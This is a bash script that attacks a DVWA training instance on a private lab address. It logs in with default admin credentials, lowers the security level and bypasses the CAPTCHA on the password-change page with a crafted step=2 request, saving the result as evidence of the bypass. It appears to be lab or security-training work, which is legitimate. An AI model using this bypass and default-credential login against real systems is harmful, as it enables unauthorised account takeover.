#!/bin/bash
B=http://10.31.0.87:3000; J=/tmp/cap_ck.txt; rm -f $J
T=$(curl -s -c $J $B/login.php | grep -o "name='user_token' value='[a-f0-9]*'" | grep -o "[a-f0-9]\{32\}")
curl -s -b $J -c $J -d "username=admin&password=password&Login=Login&user_token=$T" $B/login.php -o /dev/null
curl -s -b $J -c $J -d "security=low&seclev_submit=Submit" $B/security.php -o /dev/null
CK=$(grep PHPSESSID $J | awk '{print $7}'); K="PHPSESSID=$CK; security=low"
# classic DVWA captcha-low bypass: step=2, g-recaptcha-response empty, key 'h4ck3r'
curl -s -H "Cookie: $K" --data-urlencode "step=2" --data-urlencode "g-recaptcha-response=" --data-urlencode "key=h4ck3r" --data-urlencode "password_new=Run3Bypass1!" --data-urlencode "password_conf=Run3Bypass1!" --data-urlencode "Change=Change" $B/vulnerabilities/captcha/ -o evidence/captcha/captcha-low-bypass-r3.html
grep -o "Password Changed\|CAPTCHA was incorrect" evidence/captcha/captcha-low-bypass-r3.html | sort | uniq -c
